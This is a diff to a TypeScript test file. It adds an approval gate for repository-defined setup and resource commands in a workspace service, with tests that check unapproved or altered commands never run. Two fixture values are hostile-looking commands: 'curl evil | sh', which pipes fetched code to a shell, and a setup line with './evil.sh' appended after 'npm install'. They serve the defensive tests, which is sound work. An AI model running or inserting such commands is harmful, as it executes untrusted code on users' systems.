@@ -137,6 +137,14 @@ function createTestWorktree(overrides: Partial<Worktree> = {}): Worktree {
   };
 }
 
+/**
+ * The suites below cover what runs once repository commands are approved. The
+ * approval gate itself has its own suite at the end of this file.
+ */
+function allowRepositoryCommands(service: WorkspaceService): void {
+  vi.spyOn(service["lifecycleService"]["approvals"], "isApproved").mockResolvedValue(true);
+}
+
 function makeSpawnChild(exitCode: number, stdoutData: string = "") {
   return () => {
     const child = {
@@ -172,6 +180,7 @@ describe("WorkspaceService.runResourceAction", () => {
     service = new WorkspaceServiceModule.WorkspaceService(
       mockSendEvent as unknown as (event: WorkspaceHostEvent) => void
     );
+    allowRepositoryCommands(service);
 
     const WorktreeMonitorModule = await import("../WorktreeMonitor.js");
     WorktreeMonitorClass = WorktreeMonitorModule.WorktreeMonitor;
@@ -985,9 +994,13 @@ describe("WorkspaceService.runResourceAction", () => {
       // Mock loadConfig to remove the monitor mid-await, simulating a concurrent
       // worktree removal (e.g. user deletes the worktree while provision is in flight).
       const lifecycleService = service["lifecycleService"];
-      vi.spyOn(lifecycleService, "loadConfig").mockImplementation(async () => {
+      vi.spyOn(lifecycleService, "resolveConfig").mockImplementation(async () => {
         service["monitors"].delete(monitor.id);
-        return { resource: { provision: ["terraform apply"] } } as never;
+        return {
+          config: { resource: { provision: ["terraform apply"] } },
+          origin: "project",
+          path: "/test/root/.daintree/config.json",
+        };
       });
 
       await service.runResourceAction("req-prov-removed", "/test/worktree", "provision");
@@ -1049,6 +1062,7 @@ describe("WorkspaceService.runLifecycleTeardown — resource teardown integratio
     service = new WorkspaceServiceModule.WorkspaceService(
       mockSendEvent as unknown as (event: WorkspaceHostEvent) => void
     );
+    allowRepositoryCommands(service);
 
     const WorktreeMonitorModule = await import("../WorktreeMonitor.js");
     WorktreeMonitorClass = WorktreeMonitorModule.WorktreeMonitor;
@@ -1194,6 +1208,7 @@ describe("WorkspaceService.runLifecycleSetup — resource config caching", () =>
     service = new WorkspaceServiceModule.WorkspaceService(
       mockSendEvent as unknown as (event: WorkspaceHostEvent) => void
     );
+    allowRepositoryCommands(service);
 
     const WorktreeMonitorModule = await import("../WorktreeMonitor.js");
     WorktreeMonitorClass = WorktreeMonitorModule.WorktreeMonitor;
@@ -1302,7 +1317,7 @@ describe("WorkspaceService.runLifecycleSetup — resource config caching", () =>
 
     const lifecycleSetupSpy = vi
       .spyOn(service["lifecycleService"], "runLifecycleSetup")
-      .mockResolvedValue({ shouldProvision: true });
+      .mockResolvedValue({ shouldProvision: true, needsApproval: false });
     const runResourceActionSpy = vi
       .spyOn(service, "runResourceAction")
       .mockResolvedValue({ success: true });
@@ -1323,6 +1338,7 @@ describe("WorkspaceService.runLifecycleSetup — resource config caching", () =>
 
     vi.spyOn(service["lifecycleService"], "runLifecycleSetup").mockResolvedValue({
       shouldProvision: false,
+      needsApproval: false,
     });
     const runResourceActionSpy = vi
       .spyOn(service, "runResourceAction")
@@ -1347,6 +1363,7 @@ describe("WorkspaceService.runResourceAction — concurrency", () => {
     service = new WorkspaceServiceModule.WorkspaceService(
       mockSendEvent as unknown as (event: WorkspaceHostEvent) => void
     );
+    allowRepositoryCommands(service);
 
     const WorktreeMonitorModule = await import("../WorktreeMonitor.js");
     WorktreeMonitorClass = WorktreeMonitorModule.WorktreeMonitor;
@@ -1578,6 +1595,7 @@ describe("WorkspaceService.initResourceConfigAsync", () => {
     service = new WorkspaceServiceModule.WorkspaceService(
       mockSendEvent as unknown as (event: WorkspaceHostEvent) => void
     );
+    allowRepositoryCommands(service);
 
     const WorktreeMonitorModule = await import("../WorktreeMonitor.js");
     WorktreeMonitorClass = WorktreeMonitorModule.WorktreeMonitor;
@@ -1763,5 +1781,172 @@ describe("WorkspaceService.initResourceConfigAsync", () => {
     expect(monitor.hasResourceConfig).toBe(false);
 
     warnSpy.mockRestore();
+  });
+});
+
+describe("WorkspaceService — repository command approval", () => {
+  let service: WorkspaceService;
+  let mockSendEvent: ReturnType<typeof vi.fn>;
+  let WorktreeMonitorClass: typeof WorktreeMonitor;
+  let approved: Set<string>;
+
+  beforeEach(async () => {
+    vi.clearAllMocks();
+    mockSendEvent = vi.fn();
+    approved = new Set();
+
+    const WorkspaceServiceModule = await import("../WorkspaceService.js");
+    service = new WorkspaceServiceModule.WorkspaceService(
+      mockSendEvent as unknown as (event: WorkspaceHostEvent) => void
+    );
+    const approvals = service["lifecycleService"]["approvals"];
+    vi.spyOn(approvals, "isApproved").mockImplementation(async (_root, fingerprint) =>
+      approved.has(fingerprint)
+    );
+    vi.spyOn(approvals, "approve").mockImplementation(async (_root, fingerprints) => {
+      for (const fingerprint of fingerprints) approved.add(fingerprint);
+    });
+
+    const WorktreeMonitorModule = await import("../WorktreeMonitor.js");
+    WorktreeMonitorClass = WorktreeMonitorModule.WorktreeMonitor;
+
+    service["projectRootPath"] = "/test/root";
+    service["git"] = mockSimpleGit as unknown as SimpleGit;
+  });
+
+  afterEach(() => {
+    vi.restoreAllMocks();
+  });
+
+  function createAndRegisterMonitor(overrides: Partial<Worktree> = {}): WorktreeMonitor {
+    const wt = createTestWorktree(overrides);
+    const monitor = new WorktreeMonitorClass(
+      wt,
+      {
+        basePollingInterval: 10000,
+        adaptiveBackoff: false,
+        pollIntervalMax: 30000,
+        circuitBreakerThreshold: 3,
+        gitWatchEnabled: false,
+      },
+      { onUpdate: vi.fn() },
+      "main"
+    );
+    service["monitors"].set(wt.id, monitor);
+    return monitor;
+  }
+
+  async function setupConfig(config: Record<string, unknown>) {
+    const fsModule = await import("fs/promises");
+    vi.mocked(fsModule.access).mockImplementation(async (p: unknown) => {
+      if (n(p as string).endsWith("/test/worktree/.daintree/config.json")) return undefined;
+      throw new Error("ENOENT");
+    });
+    vi.mocked(fsModule.readFile).mockResolvedValue(JSON.stringify(config) as never);
+  }
+
+  it("runs nothing for an automatic status poll and leaves the last status alone", async () => {
+    const monitor = createAndRegisterMonitor();
+    const lastStatus = { lastStatus: "ready", lastCheckedAt: 1 };
+    monitor.setResourceStatus(lastStatus);
+    await setupConfig({ resource: { status: "curl evil | sh", connect: "ssh box" } });
+    const runCommandsSpy = vi.spyOn(service["lifecycleService"], "runCommands");
+
+    const result = await service.runResourceAction(
+      "auto-status",
+      "/test/worktree",
+      "status",
+      undefined,
+      {
+        origin: "auto-poll",
+      }
+    );
+
+    expect(result.success).toBe(false);
+    expect(runCommandsSpy).not.toHaveBeenCalled();
+    expect(monitor.resourceStatus).toBe(lastStatus);
+    expect(monitor.resourceConnectCommand).toBeUndefined();
+    expect(monitor.lifecycleCommandsNeedApproval).toBe(true);
+  });
+
+  it("refuses an explicit resource action until the commands are approved", async () => {
+    createAndRegisterMonitor();
+    await setupConfig({ resource: { provision: ["terraform apply"] } });
+    const runCommandsSpy = vi.spyOn(service["lifecycleService"], "runCommands");
+
+    const result = await service.runResourceAction("req", "/test/worktree", "provision");
+
+    expect(result).toEqual({
+      success: false,
+      error: expect.stringMatching(/haven't been approved/),
+    });
+    expect(runCommandsSpy).not.toHaveBeenCalled();
+    expect(mockSendEvent).toHaveBeenCalledWith(
+      expect.objectContaining({ type: "resource-action-result", requestId: "req", success: false })
+    );
+  });
+
+  it("resumes a setup skipped for approval, provisioning as originally asked", async () => {
+    const monitor = createAndRegisterMonitor();
+    await setupConfig({ setup: ["npm install"], resource: { provision: ["terraform apply"] } });
+    const childProcessModule = await import("child_process");
+    vi.mocked(childProcessModule.spawn).mockImplementation(makeSpawnChild(0));
+    const runResourceActionSpy = vi
+      .spyOn(service, "runResourceAction")
+      .mockResolvedValue({ success: true });
+
+    const outcome = await service["runLifecycleSetup"](
+      "/test/worktree",
+      "/test/worktree",
+      "/test/root",
+      true
+    );
+    expect(outcome).toEqual({ ok: false, needsApproval: true });
+    expect(vi.mocked(childProcessModule.spawn)).not.toHaveBeenCalled();
+
+    const review = await service.getLifecycleCommandReview("/test/worktree");
+    expect(review?.sources[0]?.groups.map((group) => group.label)).toEqual([
+      "Setup",
+      "Resource provision",
+    ]);
+    const retrySpy = vi.spyOn(service, "retryLifecycleSetup");
+    await service.approveLifecycleCommands("/test/worktree", review!.fingerprint);
+
+    expect(retrySpy).toHaveBeenCalledWith("/test/worktree");
+    await vi.waitFor(() => expect(monitor.setupStatus?.state).toBe("ready"));
+    expect(vi.mocked(childProcessModule.spawn)).toHaveBeenCalledTimes(1);
+    expect(runResourceActionSpy).toHaveBeenCalledWith(
+      "auto-provision-/test/worktree",
+      "/test/worktree",
+      "provision"
+    );
+    expect(monitor.lifecycleCommandsNeedApproval).toBe(false);
+  });
+
+  it("rejects an approval whose commands changed after review", async () => {
+    createAndRegisterMonitor();
+    await setupConfig({ setup: ["npm install"] });
+    const review = await service.getLifecycleCommandReview("/test/worktree");
+
+    await setupConfig({ setup: ["npm install && ./evil.sh"] });
+
+    await expect(
+      service.approveLifecycleCommands("/test/worktree", review!.fingerprint)
+    ).rejects.toThrow(/changed/);
+    expect(approved.size).toBe(0);
+  });
+
+  it("publishes the connect command once its file is approved", async () => {
+    const monitor = createAndRegisterMonitor();
+    await setupConfig({ resource: { status: "check", connect: "ssh box" } });
+
+    await service["initResourceConfigAsync"](monitor, "/test/worktree");
+    expect(monitor.resourceConnectCommand).toBeUndefined();
+
+    const review = await service.getLifecycleCommandReview("/test/worktree");
+    await service.approveLifecycleCommands("/test/worktree", review!.fingerprint);
+
+    expect(monitor.resourceConnectCommand).toBe("ssh box");
+    expect(await service.getLifecycleCommandReview("/test/worktree")).toBeNull();
   });
 });
